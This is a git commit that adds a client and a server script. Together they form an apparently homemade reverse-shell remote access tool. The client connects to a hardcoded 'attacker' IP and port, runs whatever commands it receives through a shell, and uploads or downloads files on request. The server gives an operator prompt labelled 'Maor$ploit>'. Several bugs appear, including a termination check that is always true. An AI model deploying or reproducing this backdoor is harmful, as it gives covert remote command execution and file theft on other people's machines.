a3e6330a8c33ccb3f4f482abf0a5677f10f71f99
Maor Sabag <75939197+MaorExotic@users.noreply.github.com>
2021-08-05 19:31:57 +0300

    Add files via upload

---
+++ client.py
@@ -0,0 +1,61 @@
+import socket
+import subprocess
+import os
+
+
+
+def transfer(s, path):
+    if os.path.exists(path):
+        f = open(path, 'rb')
+        packet = f.read(1024)
+        while len(packet) > 0:
+            s.send(packet)
+            packet = f.read(1024)
+        s.send('DONE'.encode())
+    else:
+        s.send('File not found'.encode())
+
+def upload(s, path):
+    path = path.split('/')[-1]
+    f = open(path, 'wb')
+    while True:
+        bits = s.recv(1024)
+        if bits.endswith('DONE'.encode()):
+            f.write(bits[:-4])
+            f.close()
+            break
+        f.write(bits)
+
+def connecting():
+    s = socket.socket()
+    s.connect(("192.168.1.13", 1234)) # Server IP and Listening Port
+
+    while True:
+        command = s.recv(1024)
+
+        if 'terminate' in command.decode():
+            s.close()
+            break
+        elif 'get' in command.decode():
+            _, path = command.decode().split("|")
+            try:
+                transfer(s, path)
+            except:
+                pass
+        elif 'put' in command.decode():
+            _, path = command.decode().split("|")
+            try:
+                upload(s, path)
+                s.send('[+] Transfer Complete'.encode())
+            except:
+                s.send('[-] There was a problem with the transfer'.encode())
+        else:
+            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+            s.send(CMD.stderr.read())
+            s.send(CMD.stdout.read())
+def main():
+    connecting()
+
+
+if __name__ == '__main__':
+    main()
---
+++ server.py
@@ -0,0 +1,79 @@
+import socket
+import os
+
+
+
+def transfer(conn, command):
+    conn.send(command.encode())
+    _, path = command.split("|")
+    f = open(os.getcwd() + "/" + path, 'wb')
+    while True:
+        bits = conn.recv(1024)
+        if bits.endswith('DONE'.encode()):
+            f.write(bits[:-4])
+            f.close()
+            print("[+] Transfer completed")
+            f.close()
+            break
+        if 'File not found'.encode() in bits:
+            print ("[-] Unable to find out the file")
+            f.close()
+            os.remove(os.getcwd() + "/" + path)
+            break
+        f.write(bits)
+
+def upload(conn, command):
+    conn.send(command.encode())
+    _, path = command.split("|")
+    if os.path.exists(path):
+        f = open(path, 'rb')
+        packet = f.read(1024)
+        while len(packet) > 0:
+            conn.send(packet)
+            packet = f.read(1024)
+        conn.send('DONE'.encode())
+        f.close()
+    else:
+        s.send('File not found'.encode())
+
+
+def disconnect(conn):
+    conn.send("terminate".encode())
+    conn.close()
+    
+    
+
+def connect():
+    global s
+    s = socket.socket()
+    s.bind(("192.168.1.13", 1234)) # Edit here the Attacker Server IP and listening port
+    s.listen(1)
+    print("[*] Listening for TCP connection")
+    conn, addr = s.accept()
+    print("[+] Connection received from ", addr)
+    while True:
+        try:
+            command = input("Maor$ploit> ")
+            if 'terminate' or 'exit' in command:
+                disconnect(conn)
+                break
+            elif 'get|' in command:
+                transfer(conn, command)
+            elif 'put|' in command:
+                upload(conn, command)
+                print(conn.recv(1024).decode())
+            else:
+                if command == '':
+                    command = 'whoami'
+                conn.send(command.encode())
+                print(conn.recv(1024).decode())
+        except KeyboardInterrupt:
+            disconnect(conn)
+
+
+def main():
+    connect()
+
+
+if __name__ == '__main__':
+    main()
